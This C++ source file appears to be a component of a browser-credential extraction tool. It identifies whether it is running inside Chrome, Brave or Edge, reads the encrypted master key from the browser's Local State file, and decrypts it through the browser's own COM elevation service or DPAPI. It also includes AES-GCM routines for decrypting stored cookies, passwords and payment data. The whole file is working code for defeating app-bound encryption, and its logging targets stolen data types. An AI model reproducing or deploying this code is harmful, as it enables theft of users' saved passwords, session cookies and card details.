// BrowserCrypto.cpp - Browser-specific cryptographic operations
// Implements selective COM/DPAPI strategy based on browser and data type
#include "BrowserCrypto.h"
#include "CommunicationModule.h"
#include "RuntimeSupport.h"
#include <ShlObj.h>
#include <bcrypt.h>
#include <Wincrypt.h>
#include <cstdint>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace
{
    template <typename T>
    class ComPtr
    {
    public:
        ComPtr() = default;
        ~ComPtr() { Reset(); }
        ComPtr(const ComPtr&) = delete;
        ComPtr& operator=(const ComPtr&) = delete;

        T* Get() const noexcept { return m_pointer; }
        T* operator->() const noexcept { return m_pointer; }
        T** Put() noexcept
        {
            Reset();
            return &m_pointer;
        }

        void Reset() noexcept
        {
            if (m_pointer)
            {
                m_pointer->Release();
                m_pointer = nullptr;
            }
        }

    private:
        T* m_pointer = nullptr;
    };

    void AppendHResult(std::string& message, HRESULT result)
    {
        kvc::text::AppendHex(message, static_cast<std::uint32_t>(result), true);
    }
}

namespace SecurityComponents
{
    namespace Browser
    {
        // Browser-specific configuration database
        // Contains COM CLSIDs, IIDs, and file paths for each supported browser
        const Config* GetConfigs(std::size_t& count)
        {
            static const Config browserConfigs[] = {
                {"Chrome", L"chrome.exe",
                    {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, 
                    {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}}, 
                    L"Google\\Chrome\\User Data"},
                {"Brave", L"brave.exe",
                    {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, 
                    {0xA949CB4E, 0xC4F9, 0x44C4, {0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C}}, 
                    L"BraveSoftware\\Brave-Browser\\User Data"},
                {"Edge", L"msedge.exe",
                    {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, 
                    {0x12B23868, 0x6DCD, 0x4D1A, {0xAD, 0x4C, 0x65, 0xB0, 0x28, 0x52, 0x01, 0xFC}}, 
                    L"Microsoft\\Edge\\User Data"}
            };
            count = std::size(browserConfigs);
            return browserConfigs;
        }

        // Determines browser configuration based on current process executable name
        Config GetConfigForCurrentProcess()
        {
            wchar_t exePath[32768] = {};
            const DWORD length = GetModuleFileNameW(nullptr, exePath,
                                                    static_cast<DWORD>(std::size(exePath)));
            if (length == 0 || length >= std::size(exePath))
                return {};

            std::wstring processName = kvc::paths::FileName(exePath);
            kvc::text::LowerWideInPlace(processName);

            std::size_t count = 0;
            const Config* configs = GetConfigs(count);
            for (std::size_t i = 0; i < count; ++i)
            {
                if (kvc::text::IEqualsWide(processName, configs[i].processName))
                    return configs[i];
            }
            return {};
        }
    }

    namespace Crypto
    {
        // Encryption scheme identifier prefixes
        const uint8_t CHROME_KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
        constexpr char V10_PREFIX[] = "v10";
        constexpr char V20_PREFIX[] = "v20";

        // RAII wrapper for BCrypt algorithm handle
        class BCryptAlgorithm
        {
        public:
            BCryptAlgorithm() { 
                BCryptOpenAlgorithmProvider(&handle, BCRYPT_AES_ALGORITHM, nullptr, 0); 
            }
            ~BCryptAlgorithm() { 
                if (handle) BCryptCloseAlgorithmProvider(handle, 0); 
            }
            operator BCRYPT_ALG_HANDLE() const { return handle; }
            bool IsValid() const { return handle != nullptr; }
            
        private:
            BCRYPT_ALG_HANDLE handle = nullptr;
        };

        // RAII wrapper for BCrypt key handle
        class BCryptKey
        {
        public:
            BCryptKey(BCRYPT_ALG_HANDLE alg, const std::vector<uint8_t>& key)
            {
                BCryptGenerateSymmetricKey(alg, &handle, nullptr, 0, 
                                         const_cast<PUCHAR>(key.data()), 
                                         static_cast<ULONG>(key.size()), 0);
            }
            ~BCryptKey() { 
                if (handle) BCryptDestroyKey(handle); 
            }
            operator BCRYPT_KEY_HANDLE() const { return handle; }
            bool IsValid() const { return handle != nullptr; }
            
        private:
            BCRYPT_KEY_HANDLE handle = nullptr;
        };
        
        // Decrypts AES-GCM encrypted data using provided key
        // Supports both v10 and v20 encryption schemes
        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& blob)
        {
            size_t prefixLength = 0;
            
            // Detect encryption scheme version
            if (blob.size() >= 3)
            {
                if (memcmp(blob.data(), V10_PREFIX, 3) == 0)
                {
                    prefixLength = 3;
                }
                else if (memcmp(blob.data(), V20_PREFIX, 3) == 0)
                {
                    prefixLength = 3;
                }
                else
                {
                    return {};
                }
            }
            else
            {
                return {};
            }

            // Validate blob size
            const size_t GCM_OVERHEAD_LENGTH = prefixLength + GCM_IV_LENGTH + GCM_TAG_LENGTH;
            if (blob.size() < GCM_OVERHEAD_LENGTH)
                return {};

            // Initialize AES-GCM decryption
            BCryptAlgorithm algorithm;
            if (!algorithm.IsValid())
                return {};

            BCryptSetProperty(algorithm, BCRYPT_CHAINING_MODE, 
                            reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)), 
                            sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

            BCryptKey cryptoKey(algorithm, key);
            if (!cryptoKey.IsValid())
                return {};

            // Extract IV, ciphertext, and authentication tag
            const uint8_t* iv = blob.data() + prefixLength;
            const uint8_t* ct = iv + GCM_IV_LENGTH;
            const uint8_t* tag = blob.data() + (blob.size() - GCM_TAG_LENGTH);
            ULONG ct_len = static_cast<ULONG>(blob.size() - prefixLength - GCM_IV_LENGTH - GCM_TAG_LENGTH);
            
            // Configure authenticated cipher mode
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = const_cast<PUCHAR>(iv);
            authInfo.cbNonce = GCM_IV_LENGTH;
            authInfo.pbTag = const_cast<PUCHAR>(tag);
            authInfo.cbTag = GCM_TAG_LENGTH;
            
            // Perform decryption
            std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
            ULONG outLen = 0;
            
            NTSTATUS status = BCryptDecrypt(cryptoKey, const_cast<PUCHAR>(ct), ct_len, &authInfo, 
                                          nullptr, 0, plain.data(), static_cast<ULONG>(plain.size()), 
                                          &outLen, 0);
            if (!NT_SUCCESS(status))
                return {};

            plain.resize(outLen);
            return plain;
        }
        
        // Extracts encrypted master key from browser's Local State file
        // Handles both APPB (COM) and DPAPI blob formats
        std::vector<uint8_t> GetEncryptedMasterKey(std::wstring_view localStatePath,
                                                   std::string& error)
        {
            std::string content;
            if (!kvc::io::ReadAllText(localStatePath, content))
            {
                error = "Could not open Local State file.";
                return {};
            }
            
            // Search for encrypted key in JSON
            constexpr std::string_view appBoundTag = "\"app_bound_encrypted_key\":\"";
            constexpr std::string_view legacyTag = "\"encrypted_key\":\"";
            size_t pos = content.find(appBoundTag);
            size_t tagLength = appBoundTag.size();
            
            if (pos == std::string::npos)
            {
                pos = content.find(legacyTag);
                tagLength = legacyTag.size();
                if (pos == std::string::npos)
                {
                    error = "Encrypted key not found in Local State.";
                    return {};
                }
            }

            pos += tagLength;
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
            {
                error = "Malformed encrypted key format.";
                return {};
            }

            auto optDecoded = Utils::Base64Decode(
                std::string_view(content).substr(pos, end_pos - pos));
            if (!optDecoded)
            {
                error = "Base64 decoding of encrypted key failed.";
                return {};
            }

            auto& decodedData = *optDecoded;
            
            // Check for APPB prefix (COM-encrypted key)
            if (decodedData.size() >= sizeof(CHROME_KEY_PREFIX) && 
                memcmp(decodedData.data(), CHROME_KEY_PREFIX, sizeof(CHROME_KEY_PREFIX)) == 0)
            {
                return {decodedData.begin() + sizeof(CHROME_KEY_PREFIX), decodedData.end()};
            }
            // Check for DPAPI blob header (0x01000000)
            else if (decodedData.size() >= 4 && 
                     decodedData[0] == 0x01 && decodedData[1] == 0x00 && 
                     decodedData[2] == 0x00 && decodedData[3] == 0x00)
            {
                return decodedData;
            }
            else
            {
                error = "Unknown key format - not APPB or DPAPI blob.";
                return {};
            }
        }
    }

    BrowserManager::BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}

    std::wstring BrowserManager::getUserDataRoot() const
    {
        const std::wstring localAppData = Utils::GetLocalAppDataPath();
        if (localAppData.empty() || !m_config.userDataSubPath)
            return {};
        return kvc::paths::Join(localAppData, m_config.userDataSubPath);
    }

    MasterKeyDecryptor::MasterKeyDecryptor(PipeLogger& logger) : m_logger(logger) {}

    MasterKeyDecryptor::~MasterKeyDecryptor()
    {
        if (m_comInitialized)
            CoUninitialize();
    }

    // Decrypts master key using browser's COM elevation service
    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithCOM(
        const Browser::Config& config, const std::vector<uint8_t>& encryptedKeyBlob,
        std::string& error)
    {
        BSTR encryptedKey = SysAllocStringByteLen(
            reinterpret_cast<const char*>(encryptedKeyBlob.data()),
            static_cast<UINT>(encryptedKeyBlob.size()));
        if (!encryptedKey)
        {
            error = "Failed to allocate BSTR for encrypted key.";
            return {};
        }

        BSTR plainKey = nullptr;
        HRESULT result = E_FAIL;
        DWORD comError = 0;

        if (kvc::text::IEqualsAscii(config.name, "Edge"))
        {
            ComPtr<IEdgeElevatorFinal> elevator;
            result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid,
                                      reinterpret_cast<void**>(elevator.Put()));
            if (result == E_NOINTERFACE)
            {
                static const IID fallbackIid =
                    {0xC9C2B807, 0x7731, 0x4F34,
                     {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}};
                result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER,
                                          fallbackIid,
                                          reinterpret_cast<void**>(elevator.Put()));
            }

            std::string message = "[*] Edge CoCreateInstance hr: ";
            AppendHResult(message, result);
            m_logger.Log(message);
            if (FAILED(result))
            {
                error = "CoCreateInstance failed for Edge. HRESULT: ";
                AppendHResult(error, result);
                SysFreeString(encryptedKey);
                return {};
            }

            const HRESULT blanket = CoSetProxyBlanket(
                elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
            if (FAILED(blanket))
            {
                error = "CoSetProxyBlanket failed for Edge. HRESULT: ";
                AppendHResult(error, blanket);
                m_logger.Log("[-] " + error);
                SysFreeString(encryptedKey);
                return {};
            }

            result = elevator->DecryptData(encryptedKey, &plainKey, &comError);
            message = "[*] Edge DecryptData hr: ";
            AppendHResult(message, result);
            message.append(" comErr: ");
            kvc::text::AppendHex(message, comError, true);
            m_logger.Log(message);
            if (FAILED(result))
            {
                error = "DecryptData failed for Edge. HRESULT: ";
                AppendHResult(error, result);
                error.append(" comErr: ");
                kvc::text::AppendHex(error, comError, true);
                SysFreeString(encryptedKey);
                if (plainKey)
                    SysFreeString(plainKey);
                return {};
            }
        }
        else
        {
            ComPtr<IOriginalBaseElevator> elevator;
            result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid,
                                      reinterpret_cast<void**>(elevator.Put()));
            if (result == E_NOINTERFACE)
            {
                static const IID fallbackIid =
                    {0xA949CB4E, 0xC4F9, 0x44C4,
                     {0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C}};
                result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER,
                                          fallbackIid,
                                          reinterpret_cast<void**>(elevator.Put()));
            }

            std::string message = "[*] ";
            message.append(config.name);
            message.append(" CoCreateInstance hr: ");
            AppendHResult(message, result);
            m_logger.Log(message);
            if (SUCCEEDED(result))
            {
                const HRESULT blanket = CoSetProxyBlanket(
                    elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                    COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                    RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                if (FAILED(blanket))
                {
                    error = "CoSetProxyBlanket failed for ";
                    error.append(config.name);
                    error.append(". HRESULT: ");
                    AppendHResult(error, blanket);
                    m_logger.Log("[-] " + error);
                    SysFreeString(encryptedKey);
                    return {};
                }

                result = elevator->DecryptData(encryptedKey, &plainKey, &comError);
                message = "[*] ";
                message.append(config.name);
                message.append(" DecryptData hr: ");
                AppendHResult(message, result);
                message.append(" comErr: ");
                kvc::text::AppendHex(message, comError, true);
                m_logger.Log(message);
            }
        }

        SysFreeString(encryptedKey);

        if (FAILED(result) || !plainKey || SysStringByteLen(plainKey) != Crypto::KEY_SIZE)
        {
            if (plainKey)
                SysFreeString(plainKey);
            error = "COM elevation decryption failed for ";
            error.append(config.name);
            error.append(". HRESULT: ");
            AppendHResult(error, result);
            return {};
        }

        std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
        memcpy(aesKey.data(), plainKey, Crypto::KEY_SIZE);
        SysFreeString(plainKey);
        return aesKey;
    }

    // Decrypts master key using Windows DPAPI.
    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithDPAPI(std::wstring_view localStatePath,
                                                              std::string& error)
    {
        std::vector<uint8_t> encryptedKeyBlob =
            Crypto::GetEncryptedMasterKey(localStatePath, error);
        if (encryptedKeyBlob.empty())
            return {};

        DATA_BLOB inputBlob = {
            static_cast<DWORD>(encryptedKeyBlob.size()),
            encryptedKeyBlob.data()
        };
        DATA_BLOB outputBlob = {};

        if (!CryptUnprotectData(&inputBlob, nullptr, nullptr, nullptr, nullptr,
                                CRYPTPROTECT_UI_FORBIDDEN, &outputBlob))
        {
            error = "DPAPI decryption failed. Error: ";
            kvc::text::AppendHex(error, GetLastError(), true);
            m_logger.Log("[-] " + error);
            return {};
        }

        std::vector<uint8_t> aesKey(outputBlob.pbData,
                                    outputBlob.pbData + outputBlob.cbData);
        LocalFree(outputBlob.pbData);

        if (aesKey.size() != Crypto::KEY_SIZE)
        {
            error = "Decrypted key size mismatch: ";
            kvc::text::AppendUnsigned(error, aesKey.size());
            error.append(", expected: ");
            kvc::text::AppendUnsigned(error, Crypto::KEY_SIZE);
            m_logger.Log("[-] " + error);
            return {};
        }

        return aesKey;
    }

    // Main decryption entry point - selects strategy based on browser and data type
    std::vector<uint8_t> MasterKeyDecryptor::Decrypt(const Browser::Config& config,
                                                      std::wstring_view localStatePath,
                                                      DataType dataType,
                                                      std::string& error)
    {
        m_logger.Log("[*] Reading Local State file: " +
                     StringUtils::path_to_string(localStatePath));

        // All browsers (including Edge) use COM elevation for all data types.
        std::string dataTypeName = "data";
        switch (dataType)
        {
        case DataType::Cookies:   dataTypeName = "cookies";   break;
        case DataType::Payments:  dataTypeName = "payments";  break;
        case DataType::Passwords: dataTypeName = "passwords"; break;
        default:                  dataTypeName = "data";      break;
        }

        m_logger.Log("[*] Using COM elevation for " +
                     std::string(config.name) + " " + dataTypeName);

        if (!m_comInitialized)
        {
            const HRESULT initResult = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
            if (FAILED(initResult))
            {
                if (initResult == RPC_E_CHANGED_MODE)
                {
                    m_logger.Log("[!] COM already initialized with a different apartment model.");
                    m_comInitialized = false;
                }
                else
                {
                    error = "Failed to initialize COM library. HRESULT: ";
                    AppendHResult(error, initResult);
                    return {};
                }
            }
            else
            {
                m_comInitialized = true;
                m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
            }
        }

        std::vector<uint8_t> encryptedKeyBlob =
            Crypto::GetEncryptedMasterKey(localStatePath, error);
        if (encryptedKeyBlob.empty())
            return {};

        m_logger.Log("[*] Attempting to decrypt master key via " +
                     std::string(config.name) + "'s COM server...");

        std::vector<uint8_t> aesKey = DecryptWithCOM(config, encryptedKeyBlob, error);
        if (!aesKey.empty())
        {
            m_logger.Log("[+] " + std::string(config.name) +
                         " COM elevation decryption successful for " + dataTypeName);
        }
        return aesKey;
    }
}
